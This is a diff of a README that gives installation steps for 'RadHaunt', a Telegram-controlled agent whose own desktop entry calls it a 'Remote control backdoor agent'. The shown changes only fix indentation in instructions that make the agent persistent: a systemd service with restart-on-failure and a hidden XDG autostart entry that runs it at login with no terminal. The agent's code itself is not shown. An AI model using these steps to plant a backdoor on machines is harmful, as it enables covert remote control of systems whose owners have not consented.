@@ -48,54 +48,51 @@ Method A: Systemd Service (Recommended for standard distros like Mint, Ubuntu, A
 
     Create a new service file:
 ```bash
-    sudo nano /etc/systemd/system/radhaunt_agent.service
+sudo nano /etc/systemd/system/radhaunt_agent.service
 ```
     Paste the following configuration (replace {YOUR_USER} and {PATH_TO_PROJECT} with your actual data):
 ```bash
-    Ini, TOML
 
-    [Unit]
-    Description=RadHaunt Telegram Remote Control Agent
-    After=network.target
+[Unit]
+Description=RadHaunt Telegram Remote Control Agent
+After=network.target
 
-    [Service]
-    Type=simple
-    User={YOUR_USER}
-    ExecStart=/home/{YOUR_USER}/{PATH_TO_PROJECT}/venv/bin/python /home/{YOUR_USER}/{PATH_TO_PROJECT}/radhaunt_agent.py
-    WorkingDirectory=/home/{YOUR_USER}/{PATH_TO_PROJECT}/
-    Restart=on-failure
-    RestartSec=5
+[Service]
+Type=simple
+User={YOUR_USER}
+ExecStart=/home/{YOUR_USER}/{PATH_TO_PROJECT}/venv/bin/python /home/{YOUR_USER}/{PATH_TO_PROJECT}/radhaunt_agent.py
+WorkingDirectory=/home/{YOUR_USER}/{PATH_TO_PROJECT}/
+Restart=on-failure
+RestartSec=5
 
-    [Install]
-    WantedBy=multi-user.target
+[Install]
+WantedBy=multi-user.target
 ```
     Enable and start the service:
 ```bash
-    sudo systemctl daemon-reload
-    sudo systemctl enable radhaunt_agent.service
-    sudo systemctl start radhaunt_agent.service
+sudo systemctl daemon-reload
+sudo systemctl enable radhaunt_agent.service
+sudo systemctl start radhaunt_agent.service
 ```
 Method B: XDG Autostart (For non-systemd distros like Artix, Void, Gentoo or Desktop-only execution)
 
     Create the autostart directory if it doesn't exist:
 ```bash
-    mkdir -p ~/.config/autostart
+mkdir -p ~/.config/autostart
 ```
     Create the desktop shortcut entry:
 ```bash
-    nano ~/.config/autostart/radhaunt_agent.desktop
+nano ~/.config/autostart/radhaunt_agent.desktop
 ```
     Paste the following text into the file (update the execution path):
 ```bash
-    Ini, TOML
-
-    [Desktop Entry]
-    Type=Application
-    Name=RadHaunt Telegram Agent
-    Comment=Remote control backdoor agent
-    Exec=/home/{YOUR_USER}/{PATH_TO_PROJECT}/venv/bin/python /home/{YOUR_USER}/{PATH_TO_PROJECT}/radhaunt_agent.py
-    Terminal=false
-    X-GNOME-Autostart-enabled=true
+[Desktop Entry]
+Type=Application
+Name=RadHaunt Telegram Agent
+Comment=Remote control backdoor agent
+Exec=/home/{YOUR_USER}/{PATH_TO_PROJECT}/venv/bin/python /home/{YOUR_USER}/{PATH_TO_PROJECT}/radhaunt_agent.py
+Terminal=false
+X-GNOME-Autostart-enabled=true
 ```
 🎯 Verification
 
